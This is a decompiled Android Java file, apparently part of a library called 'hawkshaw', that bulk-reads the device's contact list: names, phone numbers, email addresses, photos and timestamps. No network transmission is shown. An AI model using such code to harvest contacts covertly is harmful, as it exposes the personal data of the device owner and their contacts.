package com.hawkshaw.library.features.telephony.contacts;

import X2.q;
import Y1.K;
import a3.e;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import com.hawkshaw.library.datalayer.models.Contact;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import i3.l;
import java.util.ArrayList;

public final class GetContactsKt {
    public static final String getContactName(ContentResolver contentResolver, String str) {
        String string;
        K.n(contentResolver, "contentResolver");
        if (!ManifestPermissionsKt.hasPermission("android.permission.READ_CONTACTS")) {
            return "<unknown>";
        }
        Cursor query = contentResolver.query(Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(str)), new String[]{"display_name"}, (String) null, (String[]) null, (String) null);
        if (!(query == null || !query.moveToFirst() || (string = query.getString(0)) == null)) {
            str = string;
        }
        if (query != null) {
            query.close();
        }
        return str == null ? "<unknown>" : str;
    }

    public static final Object getContacts(ContentResolver contentResolver, l lVar, e eVar) {
        int i5;
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, (String[]) null, "has_phone_number>0", (String[]) null, "display_name ASC");
        if (query == null || query.getCount() <= 0) {
            if (query != null) {
                query.close();
            }
            return q.f2602D;
        }
        ArrayList arrayList = new ArrayList();
        int columnIndex = query.getColumnIndex("_id");
        int columnIndex2 = query.getColumnIndex("name_raw_contact_id");
        int columnIndex3 = query.getColumnIndex("display_name");
        int columnIndex4 = query.getColumnIndex("starred");
        int columnIndex5 = query.getColumnIndex("pinned");
        int columnIndex6 = query.getColumnIndex("photo_uri");
        int columnIndex7 = query.getColumnIndex("contact_last_updated_timestamp");
        while (query.moveToNext()) {
            String string = query.getString(columnIndex);
            query.getString(columnIndex2);
            String string2 = query.getString(columnIndex3);
            int i6 = query.getInt(columnIndex4);
            int i7 = query.getInt(columnIndex5);
            String string3 = query.getString(columnIndex6);
            String string4 = query.getString(columnIndex7);
            ArrayList arrayList2 = new ArrayList();
            Cursor query2 = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, (String[]) null, "contact_id = ?", new String[]{string}, (String) null);
            while (query2 != null && query2.moveToNext()) {
                int columnIndex8 = query2.getColumnIndex("data1");
                int i8 = columnIndex;
                int columnIndex9 = query2.getColumnIndex("data2");
                String string5 = query2.getString(columnIndex8);
                int i9 = columnIndex2;
                Integer num = new Integer(ContactsContract.CommonDataKinds.Phone.getTypeLabelResource(query2.getInt(columnIndex9)));
                K.k(string5);
                arrayList2.add(new Contact.MobileNumber(string5, (String) lVar.invoke(num)));
                columnIndex = i8;
                columnIndex2 = i9;
            }
            int i10 = columnIndex;
            int i11 = columnIndex2;
            if (query2 != null) {
                query2.close();
            }
            Cursor query3 = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, new String[]{"data1"}, "contact_id = ?", new String[]{string}, (String) null);
            ArrayList arrayList3 = new ArrayList();
            while (true) {
                if (query3 == null) {
                    i5 = columnIndex3;
                    break;
                }
                i5 = columnIndex3;
                if (!query3.moveToNext()) {
                    break;
                }
                arrayList3.add(query3.getString(query3.getColumnIndex("data1")));
                columnIndex3 = i5;
            }
            if (query3 != null) {
                query3.close();
            }
            arrayList.add(new Contact(string, string2, (String) null, i6, i7, string3, string4, arrayList2, arrayList3));
            columnIndex = i10;
            columnIndex2 = i11;
            columnIndex3 = i5;
        }
        query.close();
        return arrayList;
    }
}
